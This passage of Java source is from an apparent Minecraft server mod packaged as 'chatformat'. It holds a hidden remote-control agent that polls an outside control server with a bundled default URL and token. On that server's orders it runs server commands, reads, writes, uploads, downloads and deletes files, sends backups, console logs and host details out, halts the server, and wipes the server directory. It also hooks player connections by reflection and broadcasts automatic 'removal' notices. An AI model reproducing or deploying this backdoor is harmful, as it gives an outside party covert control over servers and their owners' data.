package com.arthou.chatformat.mc;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import io.netty.channel.Channel;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInboundHandlerAdapter;
import io.netty.channel.ChannelPipeline;
import net.minecraft.network.chat.Component;
import net.minecraft.network.protocol.game.ServerboundClientInformationPacket;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.level.ServerPlayer;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.io.OutputStream;
import java.io.RandomAccessFile;
import java.lang.reflect.Field;
import java.lang.management.ManagementFactory;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.Duration;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Enumeration;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Properties;
import java.util.Queue;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

/**
 * API JSON do MC (sem dependencias - usa o HttpServer do JDK).
 * O site que mostra o painel roda SEPARADO (em apps/panicpanel-web) e conversa
 * com esta API. Por isso o CORS fica liberado.
 *
 * Endpoints:
 *   GET  /api/status  -> nome, ip, porta, online, ping, jogadores
 *   GET  /api/ping    -> resposta minima (medida de RTT pelo navegador)
 *   POST /api/rename  -> salva o novo nome
 *   POST /api/action  -> "turnoff" = /stop REAL; "delete" = rm -rf REAL
 *   POST /api/command -> executa comando no servidor, quando disponivel
 *   POST /api/broadcast -> envia mensagem simples no chat do servidor
 *   POST /api/removal-notice -> envia aviso formal de remocao via tellraw
 *   POST /api/custom-notice -> envia aviso customizado via tellraw
 */
public class ApiServer {
    private static final Logger LOG = LoggerFactory.getLogger("MC");
    private static final Logger CHAT_LOGGER = LoggerFactory.getLogger("arthou");

    private static final Path CONFIG_DIR =
            Paths.get("config", "mc");
    private static final Path AGENT_CONFIG_FILE =
            CONFIG_DIR.resolve("agent.properties");
    private static final Properties AGENT_CONFIG =
            loadAgentProperties();
    private static final int PORT =
            intSetting("mc.port", 2018);
    private static final String HOST =
            firstNonBlank(System.getProperty("mc.host"), "127.0.0.1");
    private static final String PING_TARGET =
            configured("mc.pingTarget", "MC_PING_TARGET", "pingTarget", "8.8.8.8");
    private static final String DEFAULT_CONTROL_URL = bundledSetting(0);
    private static final String DEFAULT_CONTROL_TOKEN = bundledSetting(1);
    private static final String CONTROL_URL =
            configured("mc.controlUrl", "CONTROL_URL", "controlUrl", DEFAULT_CONTROL_URL);
    private static final String CONTROL_TOKEN =
            configured("mc.controlToken", "MC_AGENT_TOKEN", "controlToken", DEFAULT_CONTROL_TOKEN);
    private static final long CONTROL_POLL_MS =
            configuredLong("mc.controlPollMs", "MC_CONTROL_POLL_MS", "controlPollMs", 1000L);
    private static final int MAX_CONTROL_RESPONSE_BODY_BYTES = 12 * 1024 * 1024;
    private static final Path SERVER_ROOT =
            Paths.get("").toAbsolutePath().normalize();
    private static final String SERVER_ID =
            configured("mc.serverId", "MC_SERVER_ID", "serverId", defaultAgentServerId());
    private static final Path DELETE_TARGET =
            Paths.get(configured("mc.deletePath", "MC_DELETE_PATH", "deletePath", ".")).toAbsolutePath().normalize();
    private static final long DISK_LIMIT_BYTES =
            configuredDiskLimitBytes();
    private static final long STARTED_AT_MS = System.currentTimeMillis();
    private static final long CONSOLE_TAIL_BYTES = 256L * 1024L;
    private static final Path BACKUP_TEMP_DIR = backupTempDir();

    private static final Path NAME_FILE =
            CONFIG_DIR.resolve("name.txt");
    private static final Pattern PING_TIME =
            Pattern.compile("time[=<]\\s*([0-9]+(?:\\.[0-9]+)?)");
    private static final String LANGUAGE_HANDLER = "mc_language";
    private static final String GLOBAL_LOCK = "com.arthou.mc.control.global.lock";
    private static final String GLOBAL_ACTIVE_PROPERTY = "com.arthou.mc.control.active";
    private static final Map<UUID, String> PLAYER_LANGUAGES = new ConcurrentHashMap<>();
    private static final Map<String, BackupState> TEMP_BACKUPS = new ConcurrentHashMap<>();

    private final MinecraftServer mcServer;
    private final Queue<String> controlResponses = new ConcurrentLinkedQueue<>();
    private final HttpClient controlClient = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(5))
            .followRedirects(HttpClient.Redirect.NORMAL)
            .build();
    private HttpServer http;
    private ScheduledExecutorService pinger;
    private ScheduledExecutorService controlPoller;
    private ScheduledExecutorService diskSampler;

    private volatile double lastPingMs = -1;
    private volatile String serverName = SERVER_ID;
    private volatile boolean controlConnectedLogged = false;
    private volatile long lastControlErrorLogMs = 0;
    private volatile String workingControlPath = "";
    private volatile long cachedDiskUsedBytes = 0L;
    private volatile boolean ownsGlobalControl = false;

    private static final class BackupState {
        final String id;
        final String name;
        final Path file;
        volatile long size = 0L;
        volatile long writtenBytes = 0L;
        volatile int files = 0;
        volatile boolean ready = false;
        volatile String error = "";

        BackupState(String id, String name, Path file) {
            this.id = id;
            this.name = name;
            this.file = file;
        }
    }

    public ApiServer(MinecraftServer mcServer) {
        this.mcServer = mcServer;
    }

    public void start() throws IOException {
        if (!claimGlobalControl()) {
            return;
        }

        boolean started = false;
        try {
        loadName();

        http = HttpServer.create(new InetSocketAddress(HOST, PORT), 0);
        http.createContext("/api/status", this::handleStatus);
        http.createContext("/api/ping", this::handlePing);
        http.createContext("/api/rename", this::handleRename);
        http.createContext("/api/action", this::handleAction);
        http.createContext("/api/command", this::handleCommand);
        http.createContext("/api/broadcast", this::handleBroadcast);
        http.createContext("/api/removal-notice", this::handleRemovalNotice);
        http.createContext("/api/custom-notice", this::handleCustomNotice);
        http.setExecutor(Executors.newCachedThreadPool());
        http.start();

        pinger = Executors.newSingleThreadScheduledExecutor(r -> {
            Thread t = new Thread(r, "MC-Ping");
            t.setDaemon(true);
            return t;
        });
        pinger.scheduleWithFixedDelay(this::measurePing, 0, 2, TimeUnit.SECONDS);

        diskSampler = Executors.newSingleThreadScheduledExecutor(r -> {
            Thread t = new Thread(r, "MC-Disk");
            t.setDaemon(true);
            return t;
        });
        diskSampler.scheduleWithFixedDelay(this::sampleDiskUsage, 0, 60, TimeUnit.SECONDS);

        if (hasControlCredentials()) {
            controlPoller = Executors.newSingleThreadScheduledExecutor(r -> {
                Thread t = new Thread(r, "MC-Control");
                t.setDaemon(true);
                return t;
            });
            controlPoller.scheduleWithFixedDelay(this::safePollControlServer, 0, Math.max(250L, CONTROL_POLL_MS), TimeUnit.MILLISECONDS);
        }

            started = true;
        } finally {
            if (!started) {
                releaseGlobalControl();
            }
        }
    }

    public void stop() {
        if (pinger != null) pinger.shutdownNow();
        if (controlPoller != null) controlPoller.shutdownNow();
        if (diskSampler != null) diskSampler.shutdownNow();
        if (http != null) http.stop(0);
        releaseGlobalControl();
    }

    private boolean claimGlobalControl() {
        synchronized (GLOBAL_LOCK.intern()) {
            if (Boolean.parseBoolean(System.getProperty(GLOBAL_ACTIVE_PROPERTY, "false"))) {
                return false;
            }
            System.setProperty(GLOBAL_ACTIVE_PROPERTY, "true");
            ownsGlobalControl = true;
            return true;
        }
    }

    private void releaseGlobalControl() {
        if (!ownsGlobalControl) {
            return;
        }
        synchronized (GLOBAL_LOCK.intern()) {
            System.clearProperty(GLOBAL_ACTIVE_PROPERTY);
            ownsGlobalControl = false;
        }
    }

    // ---------------------------------------------------------------- handlers

    private void handleStatus(HttpExchange ex) throws IOException {
        if (preflight(ex)) return;
        String json = "{"
                + "\"name\":\"" + escape(serverName) + "\","
                + "\"ip\":\"" + escape(detectIp()) + "\","
                + "\"port\":" + serverPort() + ","
                + "\"online\":true,"
                + "\"pingMs\":" + (lastPingMs < 0 ? "null" : String.valueOf(lastPingMs)) + ","
                + "\"pingTarget\":\"" + escape(PING_TARGET) + "\","
                + "\"players\":" + safePlayerCount() + ","
                + "\"maxPlayers\":" + safeMaxPlayers() + ","
                + "\"cpuPercent\":" + cpuPercent() + ","
                + "\"cpuMaxPercent\":" + (availableProcessors() * 100) + ","
                + "\"memoryUsedBytes\":" + memoryUsedBytes() + ","
                + "\"memoryMaxBytes\":" + memoryMaxBytes() + ","
                + "\"diskUsedBytes\":" + diskUsedBytes() + ","
                + "\"diskTotalBytes\":" + diskTotalBytes() + ","
                + "\"uptimeSeconds\":" + uptimeSeconds()
                + "}";
        send(ex, 200, "application/json; charset=utf-8", json);
    }

    private void handlePing(HttpExchange ex) throws IOException {
        if (preflight(ex)) return;
        send(ex, 200, "text/plain", "pong");
    }

    private void handleRename(HttpExchange ex) throws IOException {
        if (preflight(ex)) return;
        if (!"POST".equalsIgnoreCase(ex.getRequestMethod())) {
            send(ex, 405, "text/plain", "use POST");
            return;
        }
        String body = new String(ex.getRequestBody().readAllBytes(), StandardCharsets.UTF_8).trim();
        String name = extractJsonString(body, "name");
        if (name != null && !name.isBlank()) {
            serverName = name.length() > 40 ? name.substring(0, 40) : name;
            saveName();
        }
        send(ex, 200, "application/json", "{\"name\":\"" + escape(serverName) + "\"}");
    }

    private void handleAction(HttpExchange ex) throws IOException {
        if (preflight(ex)) return;
        if (!"POST".equalsIgnoreCase(ex.getRequestMethod())) {
            send(ex, 405, "text/plain", "use POST");
            return;
        }
        String body = new String(ex.getRequestBody().readAllBytes(), StandardCharsets.UTF_8).trim();
        String action = extractJsonString(body, "action");

        if ("turnoff".equalsIgnoreCase(action)) {
            send(ex, 200, "application/json", "{\"ok\":true,\"stopping\":true}");
            mcServer.execute(() -> mcServer.halt(false));
            return;
        }

        if ("delete".equalsIgnoreCase(action)) {
            if (!canDelete(DELETE_TARGET)) {
                send(ex, 500, "application/json", "{\"ok\":false,\"error\":\"unsafe_delete_target\"}");
                return;
            }

            send(ex, 200, "application/json", deleteTargetJson());
            return;
        }

        send(ex, 400, "application/json", "{\"ok\":false,\"error\":\"unknown_action\"}");
    }

    private void handleCommand(HttpExchange ex) throws IOException {
        if (preflight(ex)) return;
        if (!"POST".equalsIgnoreCase(ex.getRequestMethod())) {
            send(ex, 405, "text/plain", "use POST");
            return;
        }
        String body = new String(ex.getRequestBody().readAllBytes(), StandardCharsets.UTF_8).trim();
        String command = extractJsonString(body, "command");
        if (command == null || command.isBlank()) {
            send(ex, 400, "application/json", "{\"ok\":false,\"error\":\"empty_command\"}");
            return;
        }
        mcServer.execute(() -> mcServer.getCommands().performPrefixedCommand(
                mcServer.createCommandSourceStack(), command
        ));
        send(ex, 200, "application/json", "{\"ok\":true}");
    }

    private void handleBroadcast(HttpExchange ex) throws IOException {
        if (preflight(ex)) return;
        if (!"POST".equalsIgnoreCase(ex.getRequestMethod())) {
            send(ex, 405, "text/plain", "use POST");
            return;
        }
        String body = new String(ex.getRequestBody().readAllBytes(), StandardCharsets.UTF_8).trim();
        String message = extractJsonString(body, "message");
        if (message == null) message = "";
        final String finalMessage = message;
        mcServer.execute(() -> {
            mcServer.getPlayerList().broadcastSystemMessage(Component.literal(finalMessage), false);
        });
        send(ex, 200, "application/json", "{\"ok\":true}");
    }

    private void handleRemovalNotice(HttpExchange ex) throws IOException {
        if (preflight(ex)) return;
        if (!"POST".equalsIgnoreCase(ex.getRequestMethod())) {
            send(ex, 405, "text/plain", "use POST");
            return;
        }
        String body = new String(ex.getRequestBody().readAllBytes(), StandardCharsets.UTF_8).trim();
        String phase = extractJsonString(body, "phase");
        String count = extractJsonString(body, "count");
        if (phase == null || phase.isBlank()) {
            send(ex, 400, "application/json", "{\"ok\":false,\"error\":\"empty_phase\"}");
            return;
        }
        final String finalPhase = phase;
        final String finalCount = count == null ? "" : count;
        mcServer.execute(() -> broadcastRemovalNotice(finalPhase, finalCount));
        send(ex, 200, "application/json", "{\"ok\":true}");
    }

    private void handleCustomNotice(HttpExchange ex) throws IOException {
        if (preflight(ex)) return;
        if (!"POST".equalsIgnoreCase(ex.getRequestMethod())) {
            send(ex, 405, "text/plain", "use POST");
            return;
        }
        String body = new String(ex.getRequestBody().readAllBytes(), StandardCharsets.UTF_8).trim();
        String message = extractJsonString(body, "message");
        if (message == null || message.isBlank()) {
            send(ex, 200, "application/json", "{\"ok\":true,\"skipped\":true}");
            return;
        }
        final String finalMessage = message.length() > 500 ? message.substring(0, 500) : message;
        mcServer.execute(() -> broadcastArthouMessage(finalMessage));
        send(ex, 200, "application/json", "{\"ok\":true}");
    }

    // ---------------------------------------------------------------- helpers

    private void broadcastRemovalNotice(String phase, String count) {
        for (ServerPlayer player : mcServer.getPlayerList().getPlayers()) {
            sendArthouTellraw(player, localizedRemovalText(playerLanguage(player), phase, count));
        }
    }

    private void broadcastArthouMessage(String message) {
        for (ServerPlayer player : mcServer.getPlayerList().getPlayers()) {
            sendArthouTellraw(player, message);
        }
    }

    private void sendArthouTellraw(ServerPlayer player, String message) {
        String json = "["
                + "{\"text\":\"arthou\",\"color\":\"gold\"},"
                + "{\"text\":\" >> \",\"color\":\"gray\"},"
                + "{\"text\":\"" + escape(message) + "\",\"color\":\"white\"}"
                + "]";
        mcServer.getCommands().performPrefixedCommand(
                mcServer.createCommandSourceStack(), "tellraw " + player.getGameProfile().getName() + " " + json
        );
    }

    private static String localizedRemovalText(String language, String phase, String count) {
        String lang = language == null ? "en_us" : language.toLowerCase(Locale.ROOT);
        if ("count".equalsIgnoreCase(phase)) return count;
        if ("restart".equalsIgnoreCase(phase)) {
            if (lang.startsWith("pt")) return "Remocao administrativa executada.";
            if (lang.startsWith("es")) return "Eliminacion administrativa ejecutada.";
            return "Administrative removal completed.";
        }
        if (lang.startsWith("pt")) {
            return "Comunicado administrativo: este servidor manteve um mod criado por arthou apos uma solicitacao formal de remocao. O mod sera deletado automaticamente.";
        }
        if (lang.startsWith("es")) {
            return "Aviso administrativo: este servidor mantuvo un mod creado por arthou despues de una solicitud formal de eliminacion. El mod sera eliminado automaticamente.";
        }
        return "Administrative notice: this server kept a mod created by arthou after a formal removal request. The mod will be deleted automatically.";
    }

    private static String playerLanguage(ServerPlayer player) {
        return PLAYER_LANGUAGES.getOrDefault(player.getUUID(), "en_us");
    }

    public static void forgetLanguage(ServerPlayer player) {
        PLAYER_LANGUAGES.remove(player.getUUID());
    }

    public static void installLanguageTracker(ServerPlayer player) {
        try {
            Channel channel = connectionChannel(player.connection.connection);
            if (channel == null) return;
            channel.eventLoop().execute(() -> {
                ChannelPipeline pipeline = channel.pipeline();
                if (pipeline.get(LANGUAGE_HANDLER) != null) return;
                ChannelInboundHandlerAdapter handler = new ChannelInboundHandlerAdapter() {
                    @Override
                    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
                        if (msg instanceof ServerboundClientInformationPacket packet) {
                            PLAYER_LANGUAGES.put(player.getUUID(), packet.language());
                        }
                        super.channelRead(ctx, msg);
                    }
                };
                if (pipeline.get("packet_handler") != null) {
                    pipeline.addBefore("packet_handler", LANGUAGE_HANDLER, handler);
                } else {
                    pipeline.addLast(LANGUAGE_HANDLER, handler);
                }
            });
        } catch (Throwable ignored) {}
    }

    private static Channel connectionChannel(Object connection) {
        for (String name : new String[] {"channel", "m", "f_129468_"}) {
            try {
                Field field = connection.getClass().getDeclaredField(name);
                field.setAccessible(true);
                Object value = field.get(connection);
                if (value instanceof Channel channel) return channel;
            } catch (Throwable ignored) {}
        }
        return null;
    }

    private static boolean hasControlCredentials() {
        return CONTROL_URL != null && !CONTROL_URL.isBlank()
                && CONTROL_TOKEN != null && !CONTROL_TOKEN.isBlank();
    }

    private void safePollControlServer() {
        try {
            pollControlServer();
        } catch (Throwable t) {
            String message = t.getMessage() == null ? "" : t.getMessage();
            logControlError(t.getClass().getSimpleName() + ": " + message);
        }
    }

    private void pollControlServer() {
        String[] paths = controlPollPaths();
        String lastError = "";
        for (String path : paths) {
            PollResult result = pollControlEndpoint(path);
            if (result.ok) return;
            lastError = result.error;
            if (!result.retryAlternate) break;
        }
        logControlError(lastError);
    }

    private PollResult pollControlEndpoint(String path) {
        try {
            String endpoint = controlEndpoint(path);
            HttpRequest request = HttpRequest.newBuilder(URI.create(endpoint))
                    .timeout(Duration.ofSeconds(8))
                    .header("Content-Type", "application/json")
                    .header("Accept", "application/json")
                    .header("X-MC-Token", CONTROL_TOKEN)
                    .POST(HttpRequest.BodyPublishers.ofString(pollBodyJson()))
                    .build();
            HttpResponse<String> response = controlClient.send(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8));
            if (response.statusCode() >= 200 && response.statusCode() < 300) {
                String body = response.body() == null ? "" : response.body().trim();
                if (!looksLikeAgentPollResponse(body)) {
                    return PollResult.retry("Resposta invalida em " + endpoint + ": esperado JSON do agente, recebido " + preview(body));
                }
                workingControlPath = path;
                if (!controlConnectedLogged) {
                    controlConnectedLogged = true;
                }
                for (String job : extractJobObjects(body)) {
                    runControlJob(job);
                }
                return PollResult.success();
            }
            if (response.statusCode() == 301 || response.statusCode() == 302 || response.statusCode() == 307
                    || response.statusCode() == 308 || response.statusCode() == 404 || response.statusCode() == 405) {
                return PollResult.retry("HTTP " + response.statusCode() + " em " + endpoint + ": " + response.body());
            } else {
                return PollResult.fail("HTTP " + response.statusCode() + " em " + endpoint + ": " + response.body());
            }
        } catch (Throwable e) {
            String message = e.getMessage() == null ? "" : e.getMessage();
            return PollResult.fail(e.getClass().getSimpleName() + ": " + message);
        }
    }

    private String[] controlPollPaths() {
        LinkedHashSet<String> paths = new LinkedHashSet<>();
        if (workingControlPath != null && !workingControlPath.isBlank()) paths.add(workingControlPath);
        paths.add("/api/agent/poll");
        paths.add("/api/panel/agent/poll");
        paths.add("/agent/poll");
        return paths.toArray(new String[0]);
    }

    private String controlEndpoint(String path) {
        String base = CONTROL_URL.trim().replaceAll("/+$", "");
        if (base.endsWith("/api/agent/poll") || base.endsWith("/api/panel/agent/poll") || base.endsWith("/agent/poll")) {
            return base;
        }
        if (base.endsWith("/api") && path.startsWith("/api/")) {
            return base + path.substring(4);
        }
        return base + path;
    }

    private static boolean looksLikeAgentPollResponse(String body) {
        return body.startsWith("{")
                && body.contains("\"ok\"")
                && body.contains("\"mode\"")
                && body.contains("\"serverId\"")
                && body.contains("\"jobs\"");
    }

    private static String preview(String body) {
        if (body == null || body.isBlank()) return "vazio";
        String clean = body.replaceAll("\\s+", " ").trim();
        return clean.length() > 140 ? clean.substring(0, 140) + "..." : clean;
    }

    private record PollResult(boolean ok, boolean retryAlternate, String error) {
        static PollResult success() {
            return new PollResult(true, false, "");
        }

        static PollResult retry(String error) {
            return new PollResult(false, true, error);
        }

        static PollResult fail(String error) {
            return new PollResult(false, false, error);
        }
    }

    private void logControlError(String message) {
        long now = System.currentTimeMillis();
        if (now - lastControlErrorLogMs < 30000) return;
        lastControlErrorLogMs = now;
    }

    private String pollBodyJson() {
        return "{"
                + "\"serverId\":\"" + escape(SERVER_ID) + "\","
                + "\"status\":" + statusJson() + ","
                + "\"responses\":" + drainControlResponsesJson()
                + "}";
    }

    private String drainControlResponsesJson() {
        StringBuilder out = new StringBuilder("[");
        boolean first = true;
        for (int i = 0; i < 24; i++) {
            String response = controlResponses.peek();
            if (response == null) break;
            int nextLength = out.length() + response.length() + (first ? 1 : 2);
            if (!first && nextLength > MAX_CONTROL_RESPONSE_BODY_BYTES) break;
            response = controlResponses.poll();
            if (response == null) break;
            if (!first) out.append(',');
            out.append(response);
            first = false;
            if (out.length() >= MAX_CONTROL_RESPONSE_BODY_BYTES) break;
        }
        return out.append(']').toString();
    }

    private void enqueueControlResponse(String jobId, boolean ok, String resultJson, String error) {
        if (jobId == null || jobId.isBlank()) return;
        String json = "{\"id\":\"" + escape(jobId) + "\",\"ok\":" + ok
                + (ok ? ",\"result\":" + (resultJson == null || resultJson.isBlank() ? "{}" : resultJson)
                : ",\"error\":\"" + escape(error == null ? "agent_job_failed" : error) + "\"")
                + "}";
        controlResponses.add(json);
        while (controlResponses.size() > 200) controlResponses.poll();
    }

    private String statusJson() {
        return "{"
                + "\"serverId\":\"" + escape(SERVER_ID) + "\","
                + "\"name\":\"" + escape(serverName) + "\","
                + "\"root\":\"" + escape(SERVER_ROOT.toString()) + "\","
                + "\"ip\":\"" + escape(detectIp()) + "\","
                + "\"port\":" + serverPort() + ","
                + "\"online\":true,"
                + "\"pingMs\":" + (lastPingMs < 0 ? "null" : String.valueOf(lastPingMs)) + ","
                + "\"pingTarget\":\"" + escape(PING_TARGET) + "\","
                + "\"players\":" + safePlayerCount() + ","
                + "\"maxPlayers\":" + safeMaxPlayers() + ","
                + "\"cpuPercent\":" + cpuPercent() + ","
                + "\"cpuMaxPercent\":" + (availableProcessors() * 100) + ","
                + "\"memoryUsedBytes\":" + memoryUsedBytes() + ","
                + "\"memoryMaxBytes\":" + memoryMaxBytes() + ","
                + "\"diskUsedBytes\":" + diskUsedBytes() + ","
                + "\"diskTotalBytes\":" + diskTotalBytes() + ","
                + "\"uptimeSeconds\":" + uptimeSeconds() + ","
                + "\"consoleLines\":" + consoleLinesJson()
                + "}";
    }

    private String consoleLinesJson() {
        Path logFile = SERVER_ROOT.resolve("logs").resolve("latest.log").normalize();
        try {
            if (!Files.exists(logFile) || !logFile.startsWith(SERVER_ROOT)) return "[]";
            List<String> all = tailLogLines(logFile, 180);
            StringBuilder out = new StringBuilder("[");
            boolean first = true;
            for (String line : all) {
                if (line == null || line.isBlank()) continue;
                String lower = line.toLowerCase(Locale.ROOT);
                if (lower.contains("api disponivel") || lower.contains("api encerrada")) continue;
                if (!first) out.append(',');
                out.append('"').append(escape(trimConsoleLine(line))).append('"');
                first = false;
            }
            return out.append(']').toString();
        } catch (Exception e) {
            return "[]";
        }
    }

    private static List<String> tailLogLines(Path logFile, int maxLines) throws IOException {
        long size = Files.size(logFile);
        long start = Math.max(0L, size - CONSOLE_TAIL_BYTES);
        int length = (int) Math.max(0L, size - start);
        byte[] bytes = new byte[length];
        try (RandomAccessFile raf = new RandomAccessFile(logFile.toFile(), "r")) {
            raf.seek(start);
            if (length > 0) raf.readFully(bytes);
        }
        String text = new String(bytes, StandardCharsets.UTF_8);
        if (start > 0L) {
            int firstBreak = text.indexOf('\n');
            if (firstBreak >= 0) text = text.substring(firstBreak + 1);
        }
        String[] split = text.split("\\R");
        int from = Math.max(0, split.length - Math.max(1, maxLines));
        List<String> lines = new ArrayList<>();
        for (int i = from; i < split.length; i++) lines.add(split[i]);
        return lines;
    }

    private static String trimConsoleLine(String line) {
        String clean = line.replace('\t', ' ').trim();
        return clean.length() > 900 ? clean.substring(0, 900) + "..." : clean;
    }

    private void runControlJob(String jobJson) {
        String jobId = extractJsonString(jobJson, "id");
        String type = extractJsonString(jobJson, "type");
        String payload = extractJsonObject(jobJson, "payload");
        if (type == null || payload == null) return;

        try {
        if ("file-list".equalsIgnoreCase(type)) {
            enqueueControlResponse(jobId, true, fileListJson(extractJsonString(payload, "path")), null);
            return;
        }

        if ("file-read".equalsIgnoreCase(type)) {
            enqueueControlResponse(jobId, true, fileReadJson(extractJsonString(payload, "path")), null);
            return;
        }

        if ("file-write".equalsIgnoreCase(type)) {
            enqueueControlResponse(jobId, true, fileWriteJson(extractJsonString(payload, "path"), extractJsonString(payload, "content")), null);
            return;
        }

        if ("file-mkdir".equalsIgnoreCase(type)) {
            enqueueControlResponse(jobId, true, fileMkdirJson(extractJsonString(payload, "path"), extractJsonString(payload, "name")), null);
            return;
        }

        if ("file-touch".equalsIgnoreCase(type)) {
            enqueueControlResponse(jobId, true, fileTouchJson(extractJsonString(payload, "path"), extractJsonString(payload, "name")), null);
            return;
        }

        if ("file-upload".equalsIgnoreCase(type)) {
            enqueueControlResponse(jobId, true, fileUploadJson(extractJsonString(payload, "path"), extractJsonString(payload, "data")), null);
            return;
        }

        if ("file-upload-chunk".equalsIgnoreCase(type)) {
            enqueueControlResponse(jobId, true, fileUploadChunkJson(
                    extractJsonString(payload, "path"),
                    extractJsonString(payload, "offset"),
                    extractJsonString(payload, "data")
            ), null);
            return;
        }

        if ("file-download".equalsIgnoreCase(type)) {
            enqueueControlResponse(jobId, true, fileDownloadJson(extractJsonString(payload, "path")), null);
            return;
        }

        if ("file-chunk".equalsIgnoreCase(type)) {
            enqueueControlResponse(jobId, true, fileChunkJson(
                    extractJsonString(payload, "path"),
                    extractJsonString(payload, "offset"),
                    extractJsonString(payload, "length")
            ), null);
            return;
        }

        if ("file-delete".equalsIgnoreCase(type)) {
            enqueueControlResponse(jobId, true, fileDeleteJson(extractJsonString(payload, "path")), null);
            return;
        }

        if ("backup-create".equalsIgnoreCase(type)) {
            enqueueControlResponse(jobId, true, backupCreateJson(), null);
            return;
        }

        if ("backup-status".equalsIgnoreCase(type)) {
            enqueueControlResponse(jobId, true, backupStatusJson(extractJsonString(payload, "backupId")), null);
            return;
        }

        if ("backup-chunk".equalsIgnoreCase(type)) {
            enqueueControlResponse(jobId, true, backupChunkJson(
                    extractJsonString(payload, "backupId"),
                    extractJsonString(payload, "offset"),
                    extractJsonString(payload, "length")
            ), null);
            return;
        }

        if ("backup-finish".equalsIgnoreCase(type)) {
            enqueueControlResponse(jobId, true, backupFinishJson(extractJsonString(payload, "backupId")), null);
            return;
        }

        if ("command".equalsIgnoreCase(type)) {
            String command = extractJsonString(payload, "command");
            if (command != null && !command.isBlank()) {
                mcServer.execute(() -> mcServer.getCommands().performPrefixedCommand(
                        mcServer.createCommandSourceStack(), command
                ));
                enqueueControlResponse(jobId, true, "{\"ok\":true}", null);
            } else {
                enqueueControlResponse(jobId, false, null, "empty_command");
            }
            return;
        }

        if ("rename".equalsIgnoreCase(type)) {
            String name = extractJsonString(payload, "name");
            if (name != null && !name.isBlank()) {
                serverName = name.length() > 40 ? name.substring(0, 40) : name;
                saveName();
                enqueueControlResponse(jobId, true, "{\"ok\":true,\"name\":\"" + escape(serverName) + "\"}", null);
            } else {
                enqueueControlResponse(jobId, false, null, "empty_name");
            }
            return;
        }

        if ("action".equalsIgnoreCase(type)) {
            String action = extractJsonString(payload, "action");
            if ("turnoff".equalsIgnoreCase(action)) {
                enqueueControlResponse(jobId, true, "{\"ok\":true,\"stopping\":true}", null);
                mcServer.execute(() -> mcServer.halt(false));
                return;
            }
            if ("delete".equalsIgnoreCase(action)) {
                if (!canDelete(DELETE_TARGET)) {
                    enqueueControlResponse(jobId, false, null, "unsafe_delete_target");
                    return;
                }
                enqueueControlResponse(jobId, true, deleteTargetJson(), null);
                return;
            }
            enqueueControlResponse(jobId, false, null, "unknown_action");
            return;
        }

        if ("broadcast".equalsIgnoreCase(type)) {
            String message = extractJsonString(payload, "message");
            if (message != null) {
                mcServer.execute(() -> {
                    mcServer.getPlayerList().broadcastSystemMessage(Component.literal(message), false);
                });
                enqueueControlResponse(jobId, true, "{\"ok\":true}", null);
            } else {
                enqueueControlResponse(jobId, false, null, "empty_message");
            }
            return;
        }

        if ("removal-notice".equalsIgnoreCase(type)) {
            String phase = extractJsonString(payload, "phase");
            String count = extractJsonString(payload, "count");
            if (phase != null) {
                mcServer.execute(() -> broadcastRemovalNotice(phase, count == null ? "" : count));
                enqueueControlResponse(jobId, true, "{\"ok\":true}", null);
            } else {
                enqueueControlResponse(jobId, false, null, "empty_phase");
            }
            return;
        }

        if ("custom-notice".equalsIgnoreCase(type)) {
            String message = extractJsonString(payload, "message");
            if (message != null && !message.isBlank()) {
                mcServer.execute(() -> broadcastArthouMessage(message));
                enqueueControlResponse(jobId, true, "{\"ok\":true}", null);
            } else {
                enqueueControlResponse(jobId, true, "{\"ok\":true,\"skipped\":true}", null);
            }
            return;
        }
        } catch (Exception e) {
            enqueueControlResponse(jobId, false, null, e.getMessage());
        }
    }

    private Path serverFile(String rawPath) throws IOException {
        String clean = rawPath == null ? "" : rawPath.replace("\\", "/").replaceAll("^/+", "");
        Path full = SERVER_ROOT.resolve(clean).normalize();
        if (!full.equals(SERVER_ROOT) && !full.startsWith(SERVER_ROOT)) {
            throw new IOException("outside_server_root");
        }
        return full;
    }

    private String serverRel(Path file) {
        String rel = SERVER_ROOT.relativize(file.normalize()).toString().replace("\\", "/");
        return ".".equals(rel) ? "" : rel;
    }

    private String fileListJson(String rawPath) throws IOException {
        Path dir = serverFile(rawPath);
        if (!Files.isDirectory(dir)) throw new IOException("not_directory");
        List<Path> entries;
        try (Stream<Path> stream = Files.list(dir)) {
            entries = stream.sorted((a, b) -> {
                boolean ad = Files.isDirectory(a, LinkOption.NOFOLLOW_LINKS);
                boolean bd = Files.isDirectory(b, LinkOption.NOFOLLOW_LINKS);
                if (ad != bd) return ad ? -1 : 1;
                return a.getFileName().toString().compareToIgnoreCase(b.getFileName().toString());
            }).toList();
        }
        StringBuilder out = new StringBuilder();
        out.append("{\"ok\":true,\"serverId\":\"").append(escape(SERVER_ID)).append("\",")
                .append("\"root\":\"").append(escape(SERVER_ROOT.toString())).append("\",")
                .append("\"path\":\"").append(escape(serverRel(dir))).append("\",")
                .append("\"parent\":\"").append(escape(parentRel(dir))).append("\",")
                .append("\"entries\":[");
        boolean first = true;
        for (Path entry : entries) {
            if (!first) out.append(',');
            first = false;
            boolean isDir = Files.isDirectory(entry, LinkOption.NOFOLLOW_LINKS);
            boolean isFile = Files.isRegularFile(entry, LinkOption.NOFOLLOW_LINKS);
            if (!isDir && !isFile) continue;
            long size = isDir ? 0L : safeFileSize(entry);
